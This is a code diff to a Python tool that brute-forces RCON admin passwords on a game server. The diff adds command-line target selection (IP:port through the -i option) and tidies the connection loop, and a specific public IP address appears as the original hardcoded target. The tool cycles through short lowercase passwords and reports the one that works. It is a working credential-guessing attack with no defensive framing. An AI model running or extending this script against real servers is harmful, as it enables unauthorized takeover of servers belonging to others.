@@ -6,11 +6,19 @@ import sys
 import getopt
 from itertools import chain, product
 
-ip = "94.130.143.254"
-port = 27165
+ip_input = "94.130.143.254:27165"
 
-def ip_port_parse():
-    pass
+ip = "127.0.0.1"
+port= "20175"
+
+
+def ip_port_parse(ip_input):
+    global ip
+    global port
+    ip = ip_input.split(':', 1)[0]
+    port = ip_input[ip_input.find(':')+1:]
+    if len(ip) > 16:
+        raise Exception("Invalid IP!")
 
 
 def bruteforce_charset(charset, maxlength):
@@ -28,12 +36,11 @@ async def attempt_connection(loop, rconpassword):
     print(status)
     if 'hostname:' in status:
         print("Password is:", rconpassword)
+        rcon.close()
         sys.exit(0)
 
-    rcon.close()
 
-
-def bruteforce(chars='string.ascii_lowercase', lenght=4):
+def bruteforce(chars=string.ascii_lowercase, lenght=4):
 
     for x in bruteforce_charset(chars, lenght):
         try:
@@ -45,8 +52,23 @@ def bruteforce(chars='string.ascii_lowercase', lenght=4):
             print("Fail:", error_check, "  [X]->  ", x)
 
 
-if __name__ == '__main__':    
+def arg_parsing(argv):
+    opts, args = getopt.getopt(argv, "i:")
+    for opt, arg in opts:
+
+        if opt == '-i':
+            try:
+                ip_port_parse(arg)
+            except:
+                print("Can't parse server address!")
+                sys.exit(1)
 
 
+
+
+
+if __name__ == '__main__':
+
+    arg_parsing(sys.argv[1:])
     bruteforce()
 
